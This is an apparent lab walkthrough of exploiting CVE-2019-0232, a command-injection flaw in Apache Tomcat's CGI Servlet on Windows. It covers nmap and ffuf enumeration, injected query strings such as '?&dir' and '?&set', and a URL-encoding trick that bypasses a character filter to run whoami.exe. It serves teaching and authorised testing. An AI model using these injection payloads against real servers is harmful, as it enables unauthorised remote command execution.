# Attacking Tomcat CGI (CVE-2019-0232)

## What Is the CGI Servlet?
The **CGI Servlet** is an Apache Tomcat component that lets a web server invoke external applications (CGI scripts — Perl, Python, Bash, etc.) outside the Tomcat JVM. It acts as middleware between the web server and external programs/resources.

| Advantages                                  | Disadvantages                      |
| ------------------------------------------- | ---------------------------------- |
| Simple, effective for dynamic content       | Overhead — new process per request |
| Any language that reads stdin/writes stdout | Can't cache data between requests  |
| Reuses existing code                        | Reduces server performance         |

## The Vulnerability
**CVE-2019-0232** — critical RCE affecting **Windows** systems with `enableCmdLineArguments` enabled on Tomcat's CGI Servlet.

**Affected versions:**
- 9.0.0.M1 – 9.0.17
- 8.5.0 – 8.5.39
- 7.0.0 – 7.0.93

### Root Cause
`enableCmdLineArguments` controls whether the CGI Servlet parses the **query string** and passes it as command-line arguments to the CGI script — a legitimate feature for flexible scripts:
```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```
On Windows, the servlet **fails to properly validate this input** before passing it along. Since Windows batch/cmd treats `&` as a command separator, an attacker can append arbitrary commands:
```
http://example.com/cgi-bin/hello.bat?&dir
```
This passes `&dir` as an argument, and Windows executes `dir` as a **second command** — classic OS command injection.

## Enumeration

### Step 1 — Nmap
```bash
nmap -p- -sC -Pn 10.129.204.227 --open

8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
```
Confirms Tomcat 9.0.17 — within the vulnerable range.

### Step 2 — Find a CGI Script (ffuf)
Default CGI directory is `/cgi`. Fuzz for script extensions:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
# no hits

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
# [Status: 200] FUZZ: welcome
```
Found: `http://10.129.204.227:8080/cgi/welcome.bat`

## Exploitation

### Step 1 — Confirm Command Injection
```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
Returns directory listing output — confirms injection works. However, running arbitrary binaries like `whoami` directly fails at first.

### Step 2 — Enumerate Environment via `set`
```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
Reveals environment variables, including:
```
COMSPEC=C:\Windows\system32\cmd.exe
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SystemRoot=C:\Windows
```
Critically, **`PATH` is unset** — meaning commands must be called with their **full hardcoded path**, not just their name.

### Step 3 — Call Binaries with Full Paths
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
This fails — Tomcat's patch introduced a **regex filter blocking special characters** like `:` and `\` in the raw query string.

### Step 4 — Bypass the Filter with URL Encoding
```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
URL-encoding the path (`%3A` = `:`, `%5C` = `\`) slips past the regex filter, since the filter inspects the raw string before decoding — restoring full command execution.

## Quick Recap
| Stage       | Technique                 | Result                                           |
| ----------- | ------------------------- | ------------------------------------------------ |
| Recon       | `nmap -sC`                | Confirms vulnerable Tomcat 9.0.17                |
| Discovery   | `ffuf` on `/cgi/FUZZ.bat` | Finds `welcome.bat` CGI script                   |
| Injection   | `?&dir`                   | Confirms OS command injection                    |
| Recon (env) | `?&set`                   | Reveals `PATH` is unset — need full binary paths |
| Bypass      | URL-encode `:` and `\`    | Bypasses Tomcat's special-character filter       |
